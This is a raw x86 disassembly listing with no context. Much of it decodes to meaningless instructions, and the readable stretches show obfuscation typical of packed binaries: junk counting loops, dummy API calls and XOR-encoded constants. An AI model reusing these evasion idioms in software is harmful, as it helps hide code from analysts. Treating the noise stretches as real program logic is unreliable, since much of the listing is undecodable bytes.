  40899b:	out    dx,al
  40899c:	stc    
  40899d:	into   
  40899e:	popa   
  40899f:	xlat   BYTE PTR ds:[ebx]
  4089a0:	dec    eax
  4089a1:	push   0x7c
  4089a3:	scas   al,BYTE PTR es:[edi]
  4089a4:	xchg   ecx,eax
  4089a5:	fcom   QWORD PTR [ebp-0x6e0c76d4]
  4089ab:	test   al,0x4e
  4089ad:	sbb    DWORD PTR [edi+0x9],eax
  4089b0:	retw   0x7b76
  4089b4:	sti    
  4089b5:	pop    eax
  4089b6:	mov    ah,0x11
  4089b8:	mov    al,ds:0x4786076c
  4089bd:	ret    0x6a75
  4089c0:	push   edi
  4089c1:	jmp    0x7bcb167f
  4089c6:	mov    eax,ds:0x39560fa3
  4089cb:	mov    ebp,0x7744960
  4089d0:	fxch   st(5)
  4089d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4089d3:	inc    esp
  4089d4:	mov    esp,0x8531fd4b
  4089d9:	adc    ah,bh
  4089db:	or     ebx,0x2
  4089de:	clc    
  4089df:	adc    ecx,ecx
  4089e1:	push   esi
  4089e2:	mov    dl,0x4d
  4089e4:	sub    dh,BYTE PTR [edx+0x215c3839]
  4089ea:	inc    esi
  4089eb:	xor    BYTE PTR [ecx+0x607a5595],ch
  4089f1:	(bad)
  4089f6:	and    DWORD PTR [edi-0x6048351],ebp
  4089fc:	loop   0x408a33
  4089fe:	repnz adc ebp,esi
  408a01:	sbb    BYTE PTR [edx],bh
  408a03:	call   0xb10f:0x7f23b6a5
  408a0a:	sub    al,0x4e
  408a0c:	mov    edi,esp
  408a0e:	loopne 0x4089d4
  408a10:	aad    0x6f
  408a12:	les    edx,FWORD PTR [ebp-0x79]
  408a15:	aas    
  408a16:	fcomip st,st(0)
  408a18:	sbb    BYTE PTR [edi-0x77],cl
  408a1b:	sub    eax,0x49d02a5a
  408a20:	pop    esp
  408a21:	xor    BYTE PTR [edi],0x45
  408a24:	inc    esi
  408a25:	push   ebx
  408a26:	out    dx,al
  408a27:	rol    BYTE PTR [ecx+0x3f],cl
  408a2a:	lods   eax,DWORD PTR ds:[esi]
  408a2b:	mov    bl,0xc5
  408a2d:	adc    eax,0x1052945f
  408a32:	sbb    eax,0xced44795
  408a37:	jae    0x408a6f
  408a39:	jb     0x4089db
  408a3b:	jbe    0x408a32
  408a3d:	test   al,0x89
  408a3f:	stos   BYTE PTR es:[edi],al
  408a40:	xor    ah,BYTE PTR [ecx+0x79]
  408a43:	in     al,0x6b
  408a45:	mov    cl,0x72
  408a47:	(bad)  
  408a48:	iret   
  408a49:	ds out 0x12,eax
  408a4c:	ret    
  408a4d:	mov    ch,bl
  408a4f:	sub    BYTE PTR [ecx+esi*4-0x38f8d874],al
  408a56:	js     0x4089de
  408a58:	jmp    0xd762:0xdb9331e1
  408a5f:	bndstx [esi],bnd1
  408a62:	fstp   TBYTE PTR [ebx]
  408a64:	dec    esp
  408a65:	and    al,0x2e
  408a67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408a68:	xor    BYTE PTR [ecx+0x55],0xe8
  408a6c:	(bad)  
  408a6d:	mov    edx,0x4e46c322
  408a72:	fmul   DWORD PTR ds:0x43fef293
  408a78:	or     ecx,0x81161d8f
  408a7e:	mov    eax,ecx
  408a80:	pop    ebp
  408a81:	ret    0x18
  408a84:	push   ebp
  408a85:	mov    ebp,esp
  408a87:	push   ecx
  408a88:	mov    DWORD PTR ds:0x42e86a,0x1d
  408a92:	cmp    DWORD PTR ds:0x42e86a,0x0
  408a99:	je     0x408add
  408a9f:	cmp    DWORD PTR ds:0x42e86a,0x1f
  408aa6:	jne    0x408ac1
  408aac:	push   0x430596
  408ab1:	push   0x42ef30
  408ab6:	push   0x69fb
  408abb:	call   DWORD PTR ds:0x42ebac
  408ac1:	mov    ecx,DWORD PTR ds:0x42e86a
  408ac7:	dec    ecx
  408ac8:	mov    DWORD PTR ds:0x42e86a,ecx
  408ace:	jmp    0x408a92
  408ad3:	adc    DWORD PTR ds:0x42e866,0x3f8f
  408add:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  408ae4:	mov    eax,DWORD PTR [ebp-0x4]
  408ae7:	sbb    edx,0xd84
  408aed:	mov    edx,DWORD PTR [ebp+0x10]
  408af0:	xor    DWORD PTR ds:0x4305c2,0x464
  408afa:	mov    ecx,0x7510856
  408aff:	xor    eax,ecx
  408b01:	jmp    0x408cf5
  408b06:	jno    0x408b66
  408b08:	test   bl,ah
  408b0a:	gs in  eax,0x51
  408b0d:	or     BYTE PTR fs:[eax],dh
  408b10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b11:	outs   dx,DWORD PTR ds:[esi]
  408b12:	adc    eax,0xa583452d
  408b17:	sar    BYTE PTR [esi+0x7e],cl
  408b1a:	inc    ebp
  408b1b:	jg     0x408b9b
  408b1d:	jle    0x408ac3
  408b1f:	inc    edx
  408b20:	cwde   
  408b21:	icebp  
  408b22:	nop
  408b23:	jno    0x408b3b
  408b25:	and    DWORD PTR ds:[ebp-0x57],edx
  408b29:	sbb    ecx,DWORD PTR ss:[edi-0x46]
  408b2d:	outs   dx,DWORD PTR ds:[esi]
  408b2e:	into   
  408b2f:	je     0x408b0f
  408b31:	pop    eax
  408b32:	shl    DWORD PTR [eax+ebp*4+0x72f85131],1
  408b39:	inc    esi
  408b3a:	mov    WORD PTR [bx+si-0x2932],?
  408b3f:	frstor [ebx+0x39]
  408b42:	enter  0xc16f,0xf5
  408b46:	sub    eax,0xb74d69fe
  408b4b:	sahf   
  408b4c:	jo     0x408ad1
  408b4e:	cli    
  408b4f:	sub    ebp,esi
  408b51:	arpl   WORD PTR [eax+ebx*2],si
  408b54:	enter  0xf6dd,0x49
  408b58:	inc    edx
  408b59:	mov    eax,0x80806a61
  408b5e:	mov    bh,0x1d
  408b60:	loopne 0x408b35
  408b62:	js     0x408b81
  408b64:	popf   
  408b65:	add    ebp,DWORD PTR [eax]
  408b67:	xor    ax,bx
  408b6a:	cld    
  408b6b:	or     edx,eax
  408b6d:	mov    BYTE PTR [ebp+eax*1-0x46],al
  408b71:	jg     0x408b53
  408b73:	sub    DWORD PTR [edx],0xffffffe2
  408b76:	repnz push ds
  408b78:	pop    ds
  408b79:	es js  0x408ba3
  408b7c:	sahf   
  408b7d:	cdq    
  408b7e:	pop    eax
  408b7f:	dec    esp
  408b80:	mov    al,ds:0x39502d2c
  408b85:	pop    ss
  408b86:	push   ds
  408b87:	scas   eax,DWORD PTR es:[edi]
  408b88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408b89:	stos   DWORD PTR es:[edi],eax
  408b8a:	leave  
  408b8b:	lods   eax,DWORD PTR ds:[esi]
  408b8c:	cmp    al,0xf7
  408b8e:	nop
  408b8f:	in     al,dx
  408b90:	pop    esp
  408b91:	push   ss
  408b92:	pop    eax
  408b93:	dec    esi
  408b94:	sbb    dl,BYTE PTR [ebx+0x4f2a2c4f]
  408b9a:	sub    ebx,ebx
  408b9c:	adc    eax,0x5fc7b769
  408ba1:	and    BYTE PTR [edx],bl
  408ba3:	push   cs
  408ba4:	push   0x622830f0
  408ba9:	aam    0x3f
  408bab:	jo     0x408b48
  408bad:	add    ebx,DWORD PTR [esi-0x7f8c5703]
  408bb3:	xchg   esi,eax
  408bb4:	mov    ds:0x9b9ea3db,al
  408bb9:	lahf   
  408bba:	jmp    0xb908bfac
  408bbf:	mov    esi,0x937ed532
  408bc4:	or     ebp,ebp
  408bc6:	out    dx,al
  408bc7:	push   0xffffffd3
  408bc9:	xor    eax,0xe191451f
  408bce:	loopne 0x408b6d
  408bd0:	inc    sp
  408bd2:	ret    0xe326
  408bd5:	mov    esp,0xc9225df7
  408bda:	ds popf 
  408bdc:	hlt    
  408bdd:	mov    esi,0x16952c35
  408be2:	in     eax,0xd5
  408be4:	dec    edx
  408be5:	mov    bl,al
  408be7:	push   ss
  408be8:	mov    ah,0x63
  408bea:	in     al,dx
  408beb:	ins    DWORD PTR es:[edi],dx
  408bec:	dec    edi
  408bed:	jecxz  0x408be1
  408bef:	hlt    
  408bf0:	(bad)  [esi+0x26]
  408bf3:	(bad)  
  408bf4:	outs   dx,BYTE PTR ds:[esi]
  408bf5:	rep ins BYTE PTR es:[edi],dx
  408bf7:	xor    eax,0xad774bca
  408bfc:	push   DWORD PTR [ebx+eax*1-0x52404889]
  408c03:	mov    dh,0x18
  408c05:	add    edi,DWORD PTR [eax]
  408c07:	sub    BYTE PTR [edx+ecx*4+0x145af5ee],dl
  408c0e:	out    0x89,al
  408c10:	retf   0x6fa6
  408c13:	lock sub al,ch
  408c16:	push   0x7c33a50d
  408c1b:	jbe    0x408bbf
  408c1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408c1e:	js     0x408c07
  408c20:	xor    al,0x6
  408c22:	dec    eax
  408c23:	mov    eax,ds:0x6921d6
  408c28:	lods   al,BYTE PTR ds:[esi]
  408c29:	(bad)  
  408c2a:	and    DWORD PTR [ebx-0x1a0aa602],esp
  408c30:	std    
  408c31:	shl    DWORD PTR [ebp-0x34],1
  408c34:	sbb    BYTE PTR [edi-0x1b],al
  408c37:	sub    esp,DWORD PTR [ecx-0x38]
  408c3a:	and    eax,0x95b83855
  408c3f:	pop    ebp
  408c40:	in     eax,dx
  408c41:	cli    
  408c42:	loopne 0x408c3e
  408c44:	ror    bl,0x65
  408c47:	mov    eax,0xcfb56310
  408c4c:	sbb    BYTE PTR [ecx-0x463788c9],bl
  408c52:	aas    
  408c53:	movups xmm5,XMMWORD PTR [edx]
  408c56:	inc    ebx
  408c57:	pop    ebp
  408c58:	mov    eax,ds:0xec060070
  408c5d:	fcomp  st(0)
  408c5f:	ins    DWORD PTR es:[edi],dx
  408c60:	call   0x1575:0xe7df6177
  408c67:	mov    bh,0xb6
  408c69:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408c6b:	int3   
  408c6c:	inc    esp
  408c6d:	jge    0x408cdf
  408c6f:	lods   eax,DWORD PTR ds:[esi]
  408c70:	add    ebx,0xffffffff
  408c73:	mov    ds:0x50cc1eb6,al
  408c78:	sbb    al,0xac
  408c7a:	jbe    0x408c88
  408c7c:	jle    0x408c5e
  408c7e:	es nop
  408c80:	lods   al,BYTE PTR ds:[esi]
  408c81:	xchg   edi,eax
  408c82:	shr    DWORD PTR [ecx+ecx*8],cl
  408c85:	(bad)  
  408c86:	fmul   DWORD PTR [edi-0x7b]
  408c89:	mov    bh,0xe1
  408c8b:	ficomp DWORD PTR fs:[edx+esi*1-0x14]
  408c90:	push   ebp
  408c91:	addr16 aaa 
  408c93:	scas   al,BYTE PTR es:[edi]
  408c94:	lods   eax,DWORD PTR ds:[esi]
  408c95:	mov    bh,0x79
  408c97:	stc    
  408c98:	data16 mov cl,BYTE PTR [edx+0x57]
  408c9c:	adc    eax,0x1ea65464
  408ca1:	nop
  408ca2:	mov    eax,0x36fd726
  408ca7:	dec    edx
  408ca8:	jmp    DWORD PTR [eax+0x67]
  408cab:	cli    
  408cac:	mov    eax,DWORD PTR [esi+0x3c]
  408caf:	mov    ds,ecx
  408cb1:	gs pop ss
  408cb3:	loopne 0x408cc9
  408cb5:	inc    edx
  408cb6:	jne    0x408cc9
  408cb8:	mov    ebx,0xa1447f5e
  408cbd:	test   BYTE PTR [edi-0x3fa4f0fd],0xe1
  408cc4:	add    edi,DWORD PTR [ecx-0x4f4f379b]
  408cca:	call   0x8e336daa
  408ccf:	ins    DWORD PTR es:[edi],dx
  408cd0:	test   al,0x38
  408cd2:	jno    0x408cf9
  408cd4:	sub    al,0x7f
  408cd6:	inc    esp
  408cd7:	fidivr WORD PTR [eax-0x334a948c]
  408cdd:	loopne 0x408d55
  408cdf:	pand   mm5,QWORD PTR [ebx]
  408ce2:	mov    ebp,0x1b8e0e03
  408ce7:	mov    ch,bh
  408ce9:	jmp    0x3979:0xd2340195
  408cf0:	or     BYTE PTR [esi+ebp*1],bl
  408cf3:	cmp    DWORD PTR [edx+0x32729d05],ebp
  408cf9:	add    BYTE PTR [ecx+0x76158b02],cl
  408cff:	push   es
  408d00:	inc    ebx
  408d01:	add    BYTE PTR [ecx+0x430692],ah
  408d07:	sub    edx,eax
  408d09:	xor    edx,DWORD PTR [edx+eax*1]
  408d0c:	mov    eax,DWORD PTR [ebp+0x14]
  408d0f:	mov    edx,DWORD PTR [ebp+0x10]
  408d12:	mov    DWORD PTR [edx+0x4],eax
  408d15:	mov    eax,DWORD PTR [ebp+0x18]
  408d18:	mov    edx,DWORD PTR [ebp+0x10]
  408d1b:	mov    DWORD PTR [edx+0x8],eax
  408d1e:	mov    eax,DWORD PTR [ebp+0x1c]
  408d21:	mov    edx,DWORD PTR [ebp+0x10]
  408d24:	mov    DWORD PTR [edx+0xc],eax
  408d27:	mov    eax,DWORD PTR [ebp+0x20]
  408d2a:	mov    edx,DWORD PTR [ebp+0x10]
  408d2d:	mov    DWORD PTR [edx+0x10],eax
  408d30:	mov    eax,eax
  408d32:	mov    eax,DWORD PTR [ebp+0x14]
  408d35:	test   eax,eax
  408d37:	mov    eax,DWORD PTR [ebp+0x8]
  408d3a:	jne    0x408f37
  408d40:	mov    eax,DWORD PTR [ebp+0xc]
  408d43:	jmp    0x408f37
  408d48:	test   BYTE PTR [ebx+0x4d],al
  408d4b:	pushf  
  408d4c:	dec    ebp
  408d4d:	pushf  
  408d4e:	inc    ebp
  408d4f:	pop    ebx
  408d50:	cwde   
  408d51:	mov    ss,edx
  408d53:	aaa    
  408d54:	in     eax,dx
  408d55:	jb     0x408d9d
  408d57:	fisttp QWORD PTR [esp+edx*8+0x7f457e7e]
  408d5e:	jle    0x408dde
  408d60:	or     al,0x7c
  408d62:	pop    ebx
  408d63:	leave  
  408d64:	scas   eax,DWORD PTR es:[edi]
  408d65:	punpckhbw mm7,QWORD PTR [esi]
  408d68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408d69:	stos   DWORD PTR es:[edi],eax
  408d6a:	cmp    DWORD PTR [edx-0x18590596],ebx
  408d70:	xchg   ebp,esp
  408d72:	int    0xe
  408d74:	push   eax
  408d75:	cwde   
  408d76:	cdq    
  408d77:	call   0x1271:0xd79a73a
  408d7e:	ss pop ecx
  408d80:	mov    eax,0xe14be77d
  408d85:	mov    eax,ds:0xf1eea54e
  408d8a:	lds    esi,FWORD PTR [eax]
  408d8c:	inc    ebx
  408d8d:	pop    edi
  408d8e:	ficom  WORD PTR [ecx+edi*2+0x5b]
  408d92:	cmc    
  408d93:	aas    
  408d94:	cli    
  408d95:	cld    
  408d96:	and    eax,ecx
  408d98:	aaa    
  408d99:	stos   BYTE PTR es:[edi],al
  408d9a:	cmp    ch,0xdd
  408d9d:	mov    ch,BYTE PTR [edi]
  408d9f:	xchg   BYTE PTR [ecx],bl
  408da1:	jo     0x408dab
  408da3:	ret    
  408da4:	mov    edi,gs
  408da6:	je     0x408d5f
  408da8:	jnp    0x408de8
  408daa:	ret    0x3760
  408dad:	lea    ebx,[eax+0x7e]
  408db0:	push   ds
  408db1:	mov    al,ds:0x83ab8291
  408db6:	hlt    
  408db7:	push   ebx
  408db8:	xchg   edx,eax
  408db9:	fwait
  408dba:	(bad)  
  408dbb:	jno    0x408dcf
  408dbd:	outs   dx,BYTE PTR ds:[esi]
  408dbe:	lds    edi,FWORD PTR [eax+0x18]
  408dc1:	mov    ecx,0x6861591d
  408dc6:	add    bl,bh
  408dc8:	add    dh,BYTE PTR [esi]
  408dca:	sub    ecx,DWORD PTR [ecx+0x280b890d]
  408dd0:	sbb    esi,DWORD PTR ds:0x5fa2315c
  408dd6:	cmp    ch,BYTE PTR [ebx]
  408dd8:	out    0x15,al
  408dda:	jle    0x408e44
  408ddc:	adc    BYTE PTR [ebp-0x24],ah
  408ddf:	adc    eax,DWORD PTR [ebx]
  408de1:	stc    
  408de2:	pusha  
  408de3:	xchg   DWORD PTR [ebp+0x5],edi
  408de6:	stos   BYTE PTR es:[edi],al
  408de7:	(bad)  
  408de8:	pop    ebx
  408de9:	rcl    dl,1
  408deb:	xor    al,0x2c
  408ded:	cmp    eax,0x7b5d6188
  408df2:	in     eax,0x7e
  408df4:	or     esi,DWORD PTR [eax+0x4d]
  408df7:	jecxz  0x408dd9
  408df9:	test   DWORD PTR [esi+0x64c3d983],edx
  408dff:	sti    
  408e00:	push   ebx
  408e01:	jbe    0x408dea
  408e03:	(bad)  
  408e04:	cmc    
  408e05:	and    al,BYTE PTR [ebp+0x51]
  408e08:	js     0x408de6
  408e0a:	loop   0x408e2e
  408e0c:	xor    ebp,DWORD PTR [esp+ebp*1-0x52]
  408e10:	xchg   ecx,eax
  408e11:	xchg   DWORD PTR [ecx+0x3e30ea9],ecx
  408e17:	div    bh
  408e19:	mov    edx,0xcd8d3501
  408e1e:	sub    cl,ch
  408e20:	and    al,BYTE PTR [ebx-0x78]
  408e23:	push   esi
  408e24:	push   edx
  408e25:	jecxz  0x408e04
  408e27:	pop    edi
  408e28:	mov    esi,0xae3c968b
  408e2d:	mov    esp,DWORD PTR [edi-0x7]
  408e30:	xor    eax,0xae1e367a
  408e35:	test   eax,0x669a534
  408e3a:	xor    DWORD PTR [ebx+0x625996a3],esi
  408e40:	or     al,0xc7
  408e42:	pusha  
  408e43:	push   edx
  408e44:	add    BYTE PTR [ebx],cl
  408e46:	pop    eax
  408e47:	scas   eax,DWORD PTR es:[edi]
  408e48:	jmp    0x6c94df94
  408e4d:	push   ecx
  408e4e:	mov    dh,0xdc
  408e50:	into   
  408e51:	xchg   esi,eax
  408e52:	fwait
  408e53:	cld    
  408e54:	xchg   edi,eax
  408e55:	jbe    0x408e1a
  408e57:	mov    bh,bh
  408e59:	sti    
  408e5a:	fcom   DWORD PTR [ebx]
  408e5c:	jae    0x408edb
  408e5e:	inc    esi
  408e5f:	mov    ds:0x5f1b99af,al
  408e64:	js     0x408e2d
  408e66:	sahf   
  408e67:	pop    esi
  408e68:	sub    al,BYTE PTR [ecx+0x4d]
  408e6b:	scas   eax,DWORD PTR es:[edi]
  408e6c:	imul   ebp,DWORD PTR [edi+ebx*4],0x5d
  408e70:	(bad)  
  408e71:	gs sbb eax,0x23004f12
  408e77:	ss in  al,0xb5
  408e7a:	pop    esi
  408e7b:	xor    eax,0x538ba61e
  408e80:	(bad)
  408e83:	mov    dl,0xe4
  408e85:	nop
  408e86:	lods   eax,DWORD PTR es:[esi]
  408e88:	cwde   
  408e89:	xchg   sp,ax
  408e8b:	inc    ebp
  408e8c:	lahf   
  408e8d:	adc    cl,BYTE PTR [ebx-0x58]
  408e90:	cli    
  408e91:	ins    DWORD PTR es:[edi],dx
  408e92:	stos   DWORD PTR es:[edi],eax
  408e93:	imul   edx,DWORD PTR [ebx],0x95ac4882
  408e99:	clc    
  408e9a:	fild   DWORD PTR [edx+0x60]
  408e9d:	adc    DWORD PTR [ecx+0x10a94860],esp
  408ea3:	mov    ebp,0x9bf409a0
  408ea8:	fist   WORD PTR [ebp+0x759ac6fb]
  408eae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408eaf:	test   BYTE PTR [ebp-0x184f2070],bl
  408eb5:	pushf  
  408eb6:	mov    edi,esp
  408eb8:	mov    BYTE PTR [eax+0x1f2f5f7a],bl
  408ebe:	rep ins BYTE PTR es:[edi],dx
  408ec0:	push   ds
  408ec1:	jno    0x408e79
  408ec3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408ec4:	cs cmp al,0x4
  408ec8:	aas    
  408ec9:	(bad)  
  408eca:	cmp    cl,BYTE PTR [ebp+0x5011224b]
  408ed0:	or     DWORD PTR ss:[edx+edi*8-0x34],ecx
  408ed5:	and    esp,DWORD PTR [edx]
  408ed7:	jmp    0x6a33:0xc923bd3c
  408ede:	mov    ch,0xee
  408ee0:	and    BYTE PTR [ecx+0x3e933d83],ah
  408ee6:	add    al,0x2
  408ee8:	adc    esp,DWORD PTR [esi]
  408eea:	call   0xb6f1:0xdef4d5b8
  408ef1:	xor    eax,0x2eda9cee
  408ef6:	shl    BYTE PTR [ebx-0x5f],0xd9
  408efa:	xchg   edx,eax
  408efb:	shl    ch,cl
  408efd:	call   0x5e3d:0xb2c8002
  408f04:	fisub  WORD PTR [ebx-0x5f]
  408f07:	inc    edi
  408f08:	jl     0x408f48
  408f0a:	adc    al,BYTE PTR [esi-0x6c]
  408f0d:	jmp    0xeb3e:0x6c3a9915
  408f14:	xor    bh,dh
  408f16:	sub    edx,edi
  408f18:	loop   0x408f16
  408f1a:	ret    0x5a80
  408f1d:	add    al,0xce
  408f1f:	bound  ecx,QWORD PTR [ebx-0x4a]
  408f22:	call   0x3e78:0xe888978b
  408f29:	cmp    DWORD PTR [ebx],edi
  408f2b:	pop    eax
  408f2c:	enter  0xa1bf,0x8c
  408f30:	out    dx,al
  408f31:	add    dh,bl
  408f33:	push   ds
  408f34:	jbe    0x408f0a
  408f36:	rdpmc  
  408f38:	rol    DWORD PTR ds:0x32729d,0xc9
  408f3f:	ret    0x1c
  408f42:	push   ebp
  408f43:	mov    ebp,esp
  408f45:	sub    esp,0x10c
  408f4b:	push   ebx
  408f4c:	sbb    DWORD PTR ds:0x42ef08,0x42e86a
  408f56:	push   esi
  408f57:	push   edi
  408f58:	xor    DWORD PTR ds:0x430646,0x5477
  408f62:	push   0x412320
  408f67:	sbb    DWORD PTR ds:0x42ef28,0x42e866
  408f71:	call   DWORD PTR ds:0x42eb4c
  408f77:	sbb    DWORD PTR ds:0x42e862,0x6315
  408f81:	test   eax,eax
  408f83:	je     0x408f9a
  408f89:	or     DWORD PTR ds:0x4305ae,0x658e
  408f93:	xor    eax,eax
  408f95:	jmp    0x40a1a9
  408f9a:	or     DWORD PTR ds:0x4305b2,0x1a2e
  408fa4:	push   0x412364
  408fa9:	call   DWORD PTR ds:0x42ec04
  408faf:	sbb    DWORD PTR ds:0x430652,0x34b4
  408fb9:	test   ax,ax
  408fbc:	mov    DWORD PTR ds:0x42e85a,0xd26
  408fc6:	je     0x408feb
  408fcc:	push   0x786876
  408fd1:	push   0x55897097
  408fd6:	adc    DWORD PTR ds:0x4305c2,0x42ef08
  408fe0:	call   DWORD PTR ds:0x42ec80
  408fe6:	jmp    0x40a1a9
  408feb:	sub    DWORD PTR ds:0x42ef24,0x1c30
  408ff5:	call   DWORD PTR ds:0x42ec44
  408ffb:	cdq    
  408ffc:	cmp    eax,0x67876766
  409001:	mov    DWORD PTR ds:0x43065a,0x4f36
  40900b:	jne    0x409041
  409011:	cmp    edx,0x86189768
  409017:	mov    DWORD PTR ds:0x42ef14,0x24b9
  409021:	jne    0x409041
  409027:	sub    DWORD PTR ds:0x42e862,0x452
  409031:	push   0x412380
  409036:	call   DWORD PTR ds:0x42eb3c
  40903c:	jmp    0x40a1a9
  409041:	neg    DWORD PTR ds:0x4305aa
  409047:	push   0x4123e0
  40904c:	adc    DWORD PTR ds:0x42ef24,0x43059a
  409056:	call   DWORD PTR ds:0x42ebdc
  40905c:	test   ax,ax
  40905f:	jne    0x408f89
  409065:	and    DWORD PTR ds:0x42e862,0x0
  40906f:	xor    ebx,ebx
  409071:	xor    ebx,DWORD PTR ds:0x42e862
  409077:	inc    ebx
  409078:	mov    DWORD PTR ds:0x42e862,ebx
  40907e:	cmp    DWORD PTR ds:0x42e862,0x28
  409085:	jne    0x409097
  40908b:	push   DWORD PTR [ebp-0x10]
  40908e:	push   DWORD PTR [ebp-0x18]
  409091:	call   DWORD PTR ds:0x42ecac
  409097:	cmp    DWORD PTR ds:0x42e862,0x1c
  40909e:	jb     0x40906f
  4090a4:	mov    edx,DWORD PTR ds:0x42ef14
  4090aa:	and    DWORD PTR ds:0x42ef20,edx
  4090b0:	mov    ecx,0xf89c8535
  4090b5:	movzx  edx,BYTE PTR ds:0x43058e
  4090bc:	sbb    edx,DWORD PTR ds:0x43064e
  4090c2:	mov    DWORD PTR ds:0x43058e,edx
  4090c8:	mov    DWORD PTR [ebp-0x20],ecx
  4090cb:	and    DWORD PTR ds:0x43059e,0x0
  4090d5:	mov    edx,DWORD PTR ds:0x43059e
  4090db:	inc    edx
  4090dc:	mov    DWORD PTR ds:0x43059e,edx
  4090e2:	cmp    DWORD PTR ds:0x43059e,0x21
  4090e9:	jne    0x409109
  4090ef:	push   0x59b7
  4090f4:	push   0x42e87a
  4090f9:	push   0x42e9ad
  4090fe:	push   0x7470
  409103:	call   DWORD PTR ds:0x42ecb0
  409109:	cmp    DWORD PTR ds:0x43059e,0x15
  409110:	jb     0x4090d5
  409116:	and    DWORD PTR ds:0x42e866,0x0
  409120:	mov    edx,DWORD PTR ds:0x42e866
  409126:	inc    edx
  409127:	mov    DWORD PTR ds:0x42e866,edx
  40912d:	cmp    DWORD PTR ds:0x42e866,0x20
  409134:	jne    0x40914a
  40913a:	push   0x704d
  40913f:	push   0x180e
  409144:	call   DWORD PTR ds:0x42ebb0
  40914a:	cmp    DWORD PTR ds:0x42e866,0x13
  409151:	jb     0x409120
  409157:	adc    DWORD PTR ds:0x43059a,edi
  40915d:	mov    DWORD PTR [ebp-0x18],0xf89c8532
  409164:	and    DWORD PTR ds:0x43058a,0x0
  40916e:	mov    esi,DWORD PTR ds:0x43058a
  409174:	inc    esi
  409175:	mov    DWORD PTR ds:0x43058a,esi
  40917b:	cmp    DWORD PTR ds:0x43058a,0xd
  409182:	jne    0x40919d
  409188:	push   0x42e97b
  40918d:	push   0x42e87a
  409192:	push   0x400000
  409197:	call   DWORD PTR ds:0x42ebc8
  40919d:	cmp    DWORD PTR ds:0x43058a,0xc
  4091a4:	jne    0x4091b7
  4091aa:	mov    esi,DWORD PTR ds:0x43058a
  4091b0:	inc    esi
  4091b1:	mov    DWORD PTR ds:0x43058a,esi
  4091b7:	cmp    DWORD PTR ds:0x43058a,0x14
  4091be:	jb     0x40916e
  4091c4:	sub    esi,DWORD PTR ds:0x42ef1c
  4091ca:	lea    eax,[ebp-0x58]
  4091cd:	mov    DWORD PTR [ebp-0x60],eax
  4091d0:	add    esi,esi
  4091d2:	lea    eax,[ebp-0x50]
  4091d5:	inc    ebx
  4091d6:	mov    DWORD PTR [ebp-0x10],eax
  4091d9:	inc    esi
  4091da:	mov    eax,ds:0x4121a8
  4091df:	mov    eax,DWORD PTR [eax+0x1c8]
  4091e5:	or     DWORD PTR ds:0x43064e,0x4305a2
  4091ef:	mov    eax,DWORD PTR [eax]
  4091f1:	add    esi,ebx
  4091f3:	mov    edx,DWORD PTR [ebp-0x10]
  4091f6:	xor    esi,esi
  4091f8:	xor    esi,DWORD PTR ds:0x43064e
  4091fe:	adc    DWORD PTR ds:0x42ef18,esi
  409204:	mov    esi,0x7510856
  409209:	xor    DWORD PTR ds:0x43058e,ebx
  40920f:	xor    eax,esi
  409211:	mov    ebx,0x32729d
  409216:	add    eax,ebx
  409218:	mov    DWORD PTR [edx],eax
  40921a:	mov    eax,ds:0x43058e
  40921f:	mov    eax,ds:0x4124e4
  409224:	cmp    eax,0x23d14057
  409229:	mov    eax,DWORD PTR [ebp-0x18]
  40922c:	mov    DWORD PTR ds:0x43058e,0x7d60
  409236:	je     0x409262
  40923c:	mov    ecx,DWORD PTR [ebp-0x20]
  40923f:	xor    eax,esi
  409241:	adc    DWORD PTR ds:0x43059e,0x4305ba
  40924b:	add    eax,ebx
  40924d:	imul   eax,ecx
  409250:	mov    DWORD PTR ds:0x4305ae,0x73a3
  40925a:	mov    DWORD PTR [ebp-0x20],eax
  40925d:	jmp    0x409dc0
  409262:	xor    eax,esi
  409264:	adc    edx,0x5f1b
  40926a:	add    eax,ebx
  40926c:	mov    ds:0x4122b8,eax
  409271:	mov    edx,DWORD PTR ds:0x4305e2
  409277:	mov    eax,ds:0x42ea9c
  40927c:	sub    eax,edx
  40927e:	or     edx,DWORD PTR [edx+eax*1]
  409281:	mov    eax,DWORD PTR [ebp-0x20]
  409284:	xor    eax,esi
  409286:	add    eax,ebx
  409288:	mov    ds:0x4124e4,eax
  40928d:	sub    DWORD PTR ds:0x42e86e,0x78a9
  409297:	mov    eax,DWORD PTR [ebp-0x18]
  40929a:	add    edx,DWORD PTR ds:0x4305aa
  4092a0:	mov    edx,DWORD PTR ds:0x4122b8
  4092a6:	neg    DWORD PTR ds:0x4305ba
  4092ac:	xor    eax,esi
  4092ae:	dec    DWORD PTR ds:0x4305b2
  4092b4:	add    eax,ebx
  4092b6:	mov    DWORD PTR ds:0x430656,0x3216
  4092c0:	cmp    edx,eax
  4092c2:	jne    0x409dc0
  4092c8:	mov    eax,DWORD PTR [ebp-0x18]
  4092cb:	add    edx,0x2278
  4092d1:	mov    DWORD PTR [ebp-0x30],eax
  4092d4:	mov    eax,DWORD PTR [ebp-0x20]
  4092d7:	mov    DWORD PTR ds:0x42ef20,0x10
  4092e1:	cmp    DWORD PTR ds:0x42ef20,0x0
  4092e8:	je     0x409328
  4092ee:	cmp    DWORD PTR ds:0x42ef20,0x16
  4092f5:	jne    0x409310
  4092fb:	push   0x55c8
  409300:	push   0x6c0c
  409305:	push   0x400000
  40930a:	call   DWORD PTR ds:0x42ebcc
  409310:	mov    edi,DWORD PTR ds:0x42ef20
  409316:	dec    edi
  409317:	mov    DWORD PTR ds:0x42ef20,edi
  40931d:	jmp    0x4092e1
  409322:	add    DWORD PTR ds:0x42ef14,ebx
  409328:	mov    DWORD PTR [ebp-0x1c],eax
  40932b:	or     DWORD PTR ds:0x42e876,0x513d
  409335:	mov    eax,ds:0x4121a8
  40933a:	mov    eax,DWORD PTR [eax+0x198]
  409340:	not    edx
  409342:	mov    DWORD PTR [ebp-0xc],eax
  409345:	xor    edx,edx
  409347:	add    edx,DWORD PTR ds:0x42e872
  40934d:	adc    edx,DWORD PTR ds:0x4305c2
